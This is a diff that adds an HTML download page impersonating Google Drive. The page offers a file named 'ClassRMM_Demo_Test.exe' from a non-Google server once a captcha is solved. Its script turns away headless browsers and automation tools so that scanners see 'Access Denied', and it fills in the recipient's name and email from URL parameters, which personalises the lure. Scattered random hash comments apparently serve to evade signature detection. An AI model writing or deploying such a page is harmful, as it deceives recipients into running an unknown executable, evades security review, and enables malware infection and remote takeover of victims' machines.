@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ClassRMM_Demo_Test.exe</title>
+<!-- d8e5403bcccb944455ab7cb6c4168c4bdb8407f3da0d4227f12a3d882b5ad187 -->
+<!-- 43f9dc06ee0396c57489a454ff588572 -->
+<!-- 9319692764ea5b19a19f2285868a39dd -->
+<!-- 83d27de356fac9d6272fb71bdb250ad2 -->
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+background:#f8f9fa;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,0.1);
+max-width:480px;width:100%;padding:40px 32px;text-align:center}
+.logo{margin-bottom:24px}.brand{color:#1a73e8} .card{border-top:4px solid #1a73e8}
+.file-icon{font-size:48px;margin:16px 0}
+.file-name{font-size:18px;font-weight:600;color:#1a1a1a;margin:8px 0}
+.message{color:#666;font-size:14px;margin:12px 0 20px}
+.sender{color:#888;font-size:13px;margin-bottom:8px}
+.recipient{color:#888;font-size:13px;margin-bottom:24px}
+.captcha-wrap{display:flex;justify-content:center;margin:20px 0}
+#cap-err{color:#ef4444;font-size:13px;margin-top:8px;display:none;text-align:center}
+#dl-btn{display:none;padding:12px 32px;background:#1a73e8;color:#fff;
+border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;
+margin-top:16px;transition:opacity 0.2s}
+#dl-btn:hover{opacity:0.9}
+.footer{margin-top:24px;font-size:11px;color:#aaa}
+</style>
+<script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+
+<script>
+(function(){
+var dewydqyr=navigator.webdriver||false;
+var ybxbhevt=window.outerWidth===0||window.outerHeight===0;
+var xdsrvxai=/HeadlessChrome|PhantomJS|Selenium|puppeteer/i.test(navigator.userAgent);
+if(dewydqyr||ybxbhevt||xdsrvxai){document.body.innerHTML='<h1>Access Denied</h1>';return;}
+})();
+</script>
+</head>
+<body>
+<div class="card">
+<div class="logo"><span style="font-size:28px">🔺</span> <span style="font-size:20px;font-weight:600;color:#1a73e8;vertical-align:middle;margin-left:8px">Google Drive</span></div>
+<div class="sender">Shared by <strong>ClassRMM</strong></div>
+<div class="file-icon">📄</div>
+<div class="file-name">ClassRMM_Demo_Test.exe</div>
+<div class="message">Test file — verifying Generate Link works end-to-end.</div>
+<div class="recipient" id="recipient-info"></div>
+<div class="captcha-wrap">
+<div class="h-captcha" data-sitekey="7e1c1f66-9022-451c-b826-ec24878285a6" data-callback="onCaptchaSuccess"></div>
+</div>
+<div id="cap-err"></div>
+<button id="dl-btn">⬇ Download</button>
+<div class="footer">This file was shared securely. Verify the sender before downloading.</div>
+</div>
+<script>
+
+var _srv='https://rmm.docmail.cloud';var _lid=8;
+async function onCaptchaSuccess(token){
+var btn=document.getElementById('dl-btn');
+var err=document.getElementById('cap-err');
+err.style.display='none';
+try{
+var r=await fetch(_srv+'/generate-link/verify-captcha',{
+method:'POST',headers:{'Content-Type':'application/json'},
+body:JSON.stringify({link_id:_lid,captcha_token:token})
+});
+var d=await r.json();
+if(!r.ok){err.textContent=d.detail||'Verification failed. Please try again.';err.style.display='block';hcaptcha.reset();return;}
+var a=document.createElement('a');a.href=d.url;a.download=d.display_name;
+document.body.appendChild(a);
+btn.style.display='inline-block';btn.onclick=function(){a.click();};
+}catch(e){err.textContent='Network error. Please try again.';err.style.display='block';hcaptcha.reset();}
+}
+
+
+function getParams(){
+var p=new URLSearchParams(window.location.search);
+var n=p.get('n')||'';var e=p.get('e')||'';
+var el=document.getElementById('recipient-info');
+if(!el)return;
+if(n&&e)el.textContent='Shared with: '+decodeURIComponent(n)+' ('+decodeURIComponent(e)+')';
+else if(e)el.textContent='Shared with: '+decodeURIComponent(e);
+else el.style.display='none';
+}
+window.addEventListener('load',getParams);
+
+// c3d3764d215055da39dbacd3093fcea2b06fd134b22eb243
+</script>
+</body>
+</html>
